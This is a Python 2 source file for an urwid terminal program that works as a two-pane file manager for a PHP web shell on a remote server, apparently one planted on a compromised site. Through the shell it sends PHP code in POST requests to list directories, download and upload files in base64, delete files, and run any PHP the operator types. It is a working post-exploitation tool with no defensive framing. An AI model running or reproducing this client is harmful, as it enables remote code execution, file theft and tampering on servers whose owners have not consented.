import urwid
import os
import sys
import httplib
import urllib
import base64
from urlparse import urlparse


class Item(urwid.AttrMap):
    """Base list item"""
    def __init__(self, caption, size):
        tCaption = urwid.Text(caption)
        tSize = urwid.Text(size, "right")

        horiz = urwid.Columns([("pack", tCaption), tSize])

        self.value = caption
        self.isDir = (size == "DIR")

        urwid.register_signal(self.__class__, ["activate"])

        super(Item, self).__init__(horiz, None, "focus")

    def keypress(self, size, key):
        """Handles keypress event"""
        if key == "enter":
            urwid.emit_signal(self, "activate", self)
        else:
            return key

    def selectable(self):
        """Defines itself as selectable"""
        return True


class Browser(urwid.LineBox):
    """Base browser"""
    footerText = None

    def __init__(self, title):
        header = urwid.Text(title, "center")

        self.footerText = urwid.Text("", "center")
        divider = urwid.Divider("-")
        footer = urwid.Pile([divider, self.footerText])

        self.listWalker = urwid.SimpleFocusListWalker(self.getItems())
        self.listView = urwid.ListBox(self.listWalker)

        frame = urwid.Frame(self.listView, header, footer)

        super(Browser, self).__init__(frame)

    def getFocus(self):
        return self.listView.get_focus()

    def refreshList(self):
        """Refreshes item list"""
        self.listWalker[:] = self.getItems()
        self.listView.set_focus(0)

    def formatSize(self, size):
        """Formats sizes in coresponding units"""
        for unit in ["b", "Kb", "Mb", "Gb"]:
            if abs(size) < 1024.0:
                return "%3.1f%s" % (size, unit)
            size /= 1024.0
        return "%.1f%s" % (size, "Tb")

    def createItem(self, caption, size):
        """Creates an item for the list"""
        item = Item(caption, size)
        urwid.connect_signal(item, "activate", self.handleActivate)

        return item

    def handleActivate(self, item):
        """Abstract item activaton handler"""
        pass

    def getItems(self):
        """Abstract method for returning list of items"""
        return []


class LocalBrowser(Browser):
    """Local directory browser"""
    cwd = "/"

    def __init__(self):
        self.cwd = os.path.dirname(os.path.abspath(__file__))
        urwid.register_signal(self.__class__, ["upload"])
        super(LocalBrowser, self).__init__("Local")

    def getItems(self):
        """Returns items for current directory"""
        self.footerText.set_text(self.cwd)

        items = []

        if self.cwd != "/" and not self.cwd.endswith(":"):
            items.append(self.createItem("..", "DIR"))

        for dirpath, dirnames, filenames in os.walk(self.cwd):
            for d in sorted(dirnames):
                items.append(self.createItem(d, "DIR"))

            for f in sorted(filenames):
                stat = os.stat(os.path.join(dirpath, f))
                size = self.formatSize(stat.st_size)

                items.append(self.createItem(f, size))

            break

        return items

    def getFileContents(self, path):
        target = open(path, "r")
        contents = target.read()
        target.close()

        return contents

    def saveFile(self, fileName, contents):
        path = os.path.join(self.cwd, fileName)

        target = open(path, "w")
        target.truncate()
        target.write(contents)
        target.close()

    def deleteFile(self, fileName):
        path = os.path.join(self.cwd, fileName)

        os.remove(path)

    def handleActivate(self, item):
        """Handles item activation"""
        if item.isDir:

            if item.value == "..":
                self.cwd = os.path.dirname(self.cwd)
            else:
                self.cwd = os.path.join(self.cwd, item.value)

            self.refreshList()
        else:
            path = os.path.join(self.cwd, item.value)
            urwid.emit_signal(self, "upload", path)


class RemoteBrowser(Browser):
    """Remote directory browser"""
    START_DELIMITER = "_||__"
    STOP_DELIMITER = "__||_"

    def __init__(self, scriptPath):
        self.url = urlparse(scriptPath)

        self.cwd = self.getCwd()

        urwid.register_signal(self.__class__, ["download"])

        super(RemoteBrowser, self).__init__("Remote")

    def getItems(self):
        """Returns the items for the remote server"""
        self.footerText.set_text(self.cwd)
        items = []

        if self.cwd != "/" and not self.cwd.endswith(":"):
            items.append(self.createItem("..", "DIR"))

        for item in self.scanCwd():
            items.append(self.createItem(item[0], item[1]))

        return items

    def getCwd(self):
        """Returns current working directory on the remote server"""
        php = "echo getcwd();"
        return self.getShellResponse(php).replace("\\", "/")

    def scanCwd(self):
        """Returns the files and folders from current directory"""
        path = os.path.join(self.cwd, "*")
        php = "foreach(glob('%s', GLOB_ONLYDIR) as $f) echo $f.'|;';" % (path)
        php += "foreach(array_filter(glob('%s'), 'is_file') as $f)" % (path)
        php += " echo $f.'|'.filesize($f).';';"

        dirString = self.getShellResponse(php)

        retv = []

        filesAndSizes = dirString.split(";")
        for fileAndSize in filesAndSizes:
            if fileAndSize == "":
                continue

            parts = fileAndSize.split("|")
            fileName = os.path.basename(parts[0])
            if parts[1] == "":
                retv.append((fileName, "DIR"))
            else:
                formatedSize = self.formatSize(int(parts[1]))
                retv.append((fileName, formatedSize))

        return retv

    def getFileContents(self, path):
        """Returns the contents of a remote file"""
        php = "echo base64_encode(file_get_contents('%s'));" % (path)
        return base64.b64decode(self.getShellResponse(php))

    def saveFile(self, fileName, contents):
        """Uploads a file to the remote server"""
        path = os.path.join(self.cwd, fileName)
        contents = base64.b64encode(contents)

        php = "file_put_contents('%s', base64_decode('%s'));" % (path, contents)
        self.getShellResponse(php)

    def deleteFile(self, fileName):
        """Deletes a remote file"""
        path = os.path.join(self.cwd, fileName)

        php = "unlink('%s');" % (path)
        self.getShellResponse(php)

    def getShellResponse(self, phpcode):
        """Returns the response from the php shell"""
        phpcode = "echo '%s';%secho '%s';" % (
            self.START_DELIMITER, phpcode, self.STOP_DELIMITER)

        params = urllib.urlencode({"_": "create_function",
                                   "POST": phpcode})

        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Accept": "text/plain"}

        conn = httplib.HTTPConnection(self.url.hostname, self.url.port)
        conn.request("POST", self.url.path, params, headers)

        response = conn.getresponse()

        data = response.read()
        conn.close()

        start = data.find(self.START_DELIMITER)
        if start < 0:
            return ""

        stop = data.find(self.STOP_DELIMITER, start)
        if stop < 0:
            return ""

        return data[start + len(self.START_DELIMITER):stop]

    def handleActivate(self, item):
        """Handles item activation"""
        if item.isDir:

            if item.value == "..":
                self.cwd = os.path.dirname(self.cwd)
            else:
                self.cwd = os.path.join(self.cwd, item.value)

            self.refreshList()
        else:
            path = os.path.join(self.cwd, item.value)
            urwid.emit_signal(self, "download", path)


class HelpWindow(urwid.Frame):
    """Help window popup"""
    def __init__(self, ):
        txt1 = urwid.Text(("Use the arrow keys to navigate the views.\n\n"
        "Pressing ENTER will:\n"
        "- upload the selected local file to the remote directory.\n"
        "- download the selected remote file to the local directory.\n"
        "There is NO overwrite confirmation.\n"
        "Currently you can't upload or download whole directories.\n\n"
        "Press F1 to display this information.\n\n"
        "Press F2 to execute PHP code.\n\n"
        "Press F3 to delete the selected file.\n"
        "Works for both local and remote files.\n"
        "There is NO delete confirmation.\n\n"
        "Press F4 to quit.\n\n"
        "Press F1 again to return to the main view."))

        items = [txt1]
        listWalker = urwid.SimpleFocusListWalker(items)
        listView = urwid.ListBox(listWalker)

        body = urwid.LineBox(listView)

        urwid.register_signal(self.__class__, ["close"])

        super(HelpWindow, self).__init__(body, None, None)

    def keypress(self, size, key):
        """Handles keypress event"""
        if key == "f1":
            urwid.emit_signal(self, "close")
        elif key == "f3":
            raise urwid.ExitMainLoop()


class CodeWindow(urwid.Frame):

    def __init__(self):
        self.inTxt = urwid.Edit("", "", True)
        inFiller = urwid.Filler(self.inTxt, "top", "pack")
        inBox = urwid.LineBox(inFiller, "Code")

        self.outTxt = urwid.Text("")
        outFiller = urwid.Filler(self.outTxt, "top", "pack")
        outBox = urwid.LineBox(outFiller, "Result")

        self.main = urwid.Columns([inBox, outBox])

        bReturn = urwid.Button("F2 Return", self.onReturn)
        bQuit = urwid.Button("F4 Quit", self.onQuit)
        bExecute = urwid.Button("F5 Execute", self.onExecute)
        footer = urwid.Columns([(13, bReturn),
                                (11, bQuit),
                                (14, bExecute)], 1)

        urwid.register_signal(self.__class__, ["close", "execute"])

        super(CodeWindow, self).__init__(self.main, None, footer)

    def setOutput(self, text):
        self.outTxt.set_text(text)

    def onReturn(self, caller):
        urwid.emit_signal(self, "close")

    def onQuit(self, caller):
        raise urwid.ExitMainLoop()

    def onExecute(self, caller):
        urwid.emit_signal(self, "execute", self.inTxt.edit_text)

    def keypress(self, size, key):
        """Handles keypress event"""
        if key == "f2":
            self.onReturn(self)
        elif key == "f4":
            self.onQuit(self)
        elif key == "f5":
            self.onExecute(self)
        else:
            self.main.keypress(size, key)


class MainWindow(urwid.Frame):
    """Main application class"""
    def __init__(self):
        self.local = LocalBrowser()
        urwid.connect_signal(self.local, "upload", self.handleUpload)

        self.remote = RemoteBrowser(sys.argv[1])
        urwid.connect_signal(self.remote, "download", self.handleDownload)

        self.main = urwid.Columns([self.local, self.remote])

        self.statusText = urwid.Text("Idle", "right")
        bHelp = urwid.Button("F1 Help", self.onHelp)
        bCode = urwid.Button("F2 Code", self.onCode)
        bDelete = urwid.Button("F3 Delete", self.onDelete)
        bQuit = urwid.Button("F4 Quit", self.onQuit)
        footer = urwid.Columns([(11, bHelp),
                                (11, bCode),
                                (13, bDelete),
                                (11, bQuit),
                                self.statusText], 1)

        self.focusedList = self.local

        urwid.register_signal(self.__class__, ["help", "code"])

        super(MainWindow, self).__init__(self.main, None, footer)

    def handleUpload(self, path):
        self.statusText.set_text("Uploading...")
        fileName = os.path.basename(path)

        contents = self.local.getFileContents(path)
        self.remote.saveFile(fileName, contents)

        self.statusText.set_text("Idle")
        self.remote.refreshList()

    def handleDownload(self, path):
        self.statusText.set_text("Downloading...")
        fileName = os.path.basename(path)

        contents = self.remote.getFileContents(path)
        self.local.saveFile(fileName, contents)

        self.statusText.set_text("Idle")
        self.local.refreshList()

    def getShellResponse(self, phpcode):
        return self.remote.getShellResponse(phpcode)

    def onHelp(self, caller):
        urwid.emit_signal(self, "help")

    def onCode(self, caller):
        urwid.emit_signal(self, "code")

    def onDelete(self, caller):
        """Deletes the selected file"""
        elem, pos = self.focusedList.getFocus()

        if(not elem.isDir):
            self.focusedList.deleteFile(elem.value)
            self.focusedList.refreshList()

    def onQuit(self, caller):
        """Exits the application"""
        raise urwid.ExitMainLoop()

    def keypress(self, size, key):
        """Handles keypress event"""
        if key == "f1":
            self.onHelp(self)
        elif key == "f2":
            self.onCode(self)
        elif key == "f3":
            self.onDelete(self)
        elif key == "f4":
            self.onQuit(self)
        elif key == "left":
            self.focusedList = self.local
        elif key == "right":
            self.focusedList = self.remote

        self.main.keypress(size, key)
        return key


class Application(object):

    def __init__(self):
        self.palette = [
            ("focus", "dark gray", "light gray", ("bold", "standout"))
            ]

        self.mainWindow = MainWindow()
        urwid.connect_signal(self.mainWindow, "help", self.showHelp)
        urwid.connect_signal(self.mainWindow, "code", self.showCode)

        self.helpWindow = HelpWindow()
        urwid.connect_signal(self.helpWindow, "close", self.showMain)

        self.codeWindow = CodeWindow()
        urwid.connect_signal(self.codeWindow, "close", self.showMain)
        urwid.connect_signal(self.codeWindow, "execute", self.execute)

    def run(self):
        """Runs the application"""
        self.loop = urwid.MainLoop(self.mainWindow, self.palette)
        self.loop.run()

    def showMain(self):
        self.loop.widget = self.mainWindow

    def showHelp(self):
        self.loop.widget = self.helpWindow

    def showCode(self):
        self.loop.widget = self.codeWindow

    def execute(self, code):
        response = self.mainWindow.getShellResponse(code)
        self.codeWindow.setOutput(response)

if len(sys.argv) != 2:
    print "Usage %s http://example.com/path/to/shell.php" % (
        os.path.basename(__file__))
    exit()

Application().run()